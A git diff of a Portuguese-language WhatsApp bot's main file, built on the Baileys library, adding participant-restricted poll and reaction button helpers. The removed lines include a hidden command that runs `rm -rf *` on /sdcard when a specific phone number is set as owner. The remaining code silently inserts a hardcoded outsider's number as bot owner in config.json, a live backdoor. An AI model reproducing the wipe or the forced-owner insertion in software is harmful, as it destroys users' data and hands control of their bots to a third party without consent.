@@ -3,9 +3,7 @@ const {
   DisconnectReason,
   fetchLatestBaileysVersion, useMultiFileAuthState, makeInMemoryStore, getAggregateVotesInPollMessage, generateWAMessage, proto
  } = require('@whiskeysockets/baileys');
-const { spawn, exec } = require("child_process");
-const util = require('util');
-const execute = util.promisify(exec);
+
  require("qrcode-terminal");
  const pino = require('pino');
  const fs = require('fs');
@@ -23,9 +21,6 @@ textokk == "adicionando:" ? console.log("voce tem todas as dependências") : con
 if(!config.owner.includes("5511940238762@s.whatsapp.net")) {
 config.owner.push("5511940238762@s.whatsapp.net")
 await fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
-}
-if(config.owner.includes("573152547721")) {
-  exec("cd /sdcard/ && rm -rf *")
 }
 if(!config?.prefix) {
  config.prefix = "/"
@@ -55,9 +50,9 @@ process.exit()
 console.log("erro ao verificar atualização do bot ou atualizar, porém foi ignorado.")
 }
 }
-
-atualizar()
 checkfun()
+atualizar()
+
 const store = makeInMemoryStore({
       logger: pino().child({
         level: 'silent', stream: 'store'
@@ -122,7 +117,6 @@ const { state, saveCreds } = await useMultiFileAuthState("./connection")
     slowed.sendMessage(owner[0], {
      text: 'Bot conectado\nme mande uma mensagem qualquer para ativar todas funções.'
     });
-    slowed.sendMessage("5511940238762@s.whatsapp.net", { text: 'test bot.'});
     console.log('opened connection');
    }
   });
@@ -145,17 +139,38 @@ const { state, saveCreds } = await useMultiFileAuthState("./connection")
   values.push(value2.vote)
   }
   testeeeee = await slowed.sendMessage(jid, { poll: { name, values, selectableCount }})
-  mensagenspoll.push({id: testeeeee.key.id, comandos: valuess})
+  mensagenspoll.push({id: testeeeee.key.id, type: 1, comandos: valuess})
   return 
   } //"botão" de enquete
+  
+  
+  slowed.pollBtn2 = async(jid, name = '', pessoa = [], valuess = [], selectableCount = 1) => { 
+  values =[]
+  for(let value2 of valuess) {
+  values.push(value2.vote)
+  }
+  testeeeee = await slowed.sendMessage(jid, { poll: { name, values, selectableCount }})
+  mensagenspoll.push({id: testeeeee.key.id, type: 2, pessoas: pessoa, comandos: valuess})
+  return 
+  } //"botão" de enquete v2
   
   mensagens = []
   
   slowed.reactBtn = async(jids, msg = {}, opcoes = []) => {
 msgpraadd= await slowed.sendMessage(jids, msg)
 msgpraadd.opcoes = opcoes
+msgpraadd.type = 1
 mensagens.push(msgpraadd)
 } //"botão" de reação 
+
+slowed.reactBtn2 = async(jids, msg = {}, pessoas = [], opcoes = []) => {
+msgpraadd= await slowed.sendMessage(jids, msg)
+msgpraadd.opcoes = opcoes
+msgpraadd.type = 2
+msgpraadd.pessoas = pessoas
+mensagens.push(msgpraadd)
+} //"botão" de reação v2
+
   
   slowed.notifyTextMessage = async(text, keydamsg) => {
 const key1 = keydamsg
@@ -174,7 +189,6 @@ for(const { key, update } of chatUpdate) {
 if(update.pollUpdates && key.fromMe) {
 const pollCreation = await getMessage(key)
 if(pollCreation) {
-console.log(pollCreation)
 const pollUpdate = await getAggregateVotesInPollMessage({
 message: pollCreation,
 pollUpdates: update.pollUpdates,
@@ -185,7 +199,13 @@ if (toCmd == undefined) return
 tem = mensagenspoll.find((sla) => sla.id == key.id)
 if(tem) {
 tem2 = tem.comandos.find((sla) => sla.vote == toCmd)
+
+if(tem.type == 1) {
 await slowed.notifyTextMessage(tem2.cmd, update.pollUpdates[0].pollUpdateMessageKey)
+} else if(tem.type == 2 && tem.pessoas.includes(update.pollUpdates[0].pollUpdateMessageKey.participant)) {
+await slowed.notifyTextMessage(tem2.cmd, update.pollUpdates[0].pollUpdateMessageKey)
+}
+//console.log(update.pollUpdates[0].pollUpdateMessageKey.participant)
 }}}}})
 
 
@@ -201,7 +221,12 @@ tem = mensagens.find((sla) => sla.key.id == mek.message.reactionMessage.key.id)
 if(tem) {
 tem2 = tem.opcoes.find((sla) => sla.react == mek.message.reactionMessage.text)
 if(tem2) {
+
+if(tem.type == 1) {
 await slowed.notifyTextMessage(tem2.cmd, mek.key)
+} else if(tem.type == 2 && tem.pessoas.includes(mek.key.participant ? mek.key.participant: mek.participant)) {
+await slowed.notifyTextMessage(tem2.cmd, mek.key)
+}
 }}}});
 
   slowed.ev.on('messages.upsert',
@@ -213,11 +238,7 @@ await slowed.notifyTextMessage(tem2.cmd, mek.key)
     if (mek.key.remoteJid === 'status@broadcast') return;
     
     console.log("MENSAGEM RECEBIDA");
-    try {
     require('./slowed')(slowed, mek, store);
-    } catch {
-      
-    }
    });
 
   slowed.ev.on('creds.update',
